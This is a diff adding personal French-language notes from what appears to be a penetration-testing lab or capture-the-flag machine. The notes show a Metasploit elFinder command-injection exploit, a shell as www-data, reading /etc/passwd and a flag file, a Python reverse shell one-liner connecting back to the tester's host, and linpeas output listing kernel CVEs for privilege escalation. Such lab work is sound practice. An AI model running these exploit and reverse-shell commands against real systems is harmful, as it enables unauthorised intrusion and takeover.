@@ -156,4 +156,53 @@ msf exploit(linux/http/elfinder_archive_cmd_injection) > exploit
 [!] This exploit may require manual cleanup of 'LjciSHnRQU.zip' on the target
 [*] Exploit completed, but no session was created.
 
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set SRVPORT 8081
 
+On ets dedans --------> exploit/linux/http/elfinder_archive_cmd_injection      
+
+meterpreter > shell --help
+Process 8685 created.
+Channel 1 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+ok on est www-data
+cat /etc/passwd
+denis:x:1000:1000::/home/denis:/bin/sh
+cd /home/denis
+cat local.txt
+e2c181d8c712be573ed21d957532f546
+
+On va ouvrir un revshell 
+whereis python
+python: /usr/bin/python3.8 /usr/lib/python3.8 /usr/lib/python2.7 /usr/lib/python3.9 /etc/python3.8 /usr/local/lib/python3.8
+
+on ouvre un nc -nvlp 4444
+
+puis on execute sur la machine distante
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.49.53",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+
+
+sur ma kali
+connect to [192.168.49.53] from (UNKNOWN) [192.168.53.243] 50822
+$ cd /tmp
+
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.                                           
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded
+CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)                                                                                                                                                                           
+?? Kernel vulns found: 3
+
+??? Potential local forwarders/relays (T1049)
+www-data   44115  0.0  0.0   6764   708 pts/0    S+   17:05   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g 
+
+on retest en faisant :
+./linpeas.sh -a | tee www_enum.out
+
+ck,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read                                                                                                                                          
+  CapEff: 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read                                                                                                                                          
+  CapBnd: 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read                                                                                                                                          
+  CapAmb: 0x0000000000000000=
+
+mtn faut trouver la bonne CVE pour elever le privilège
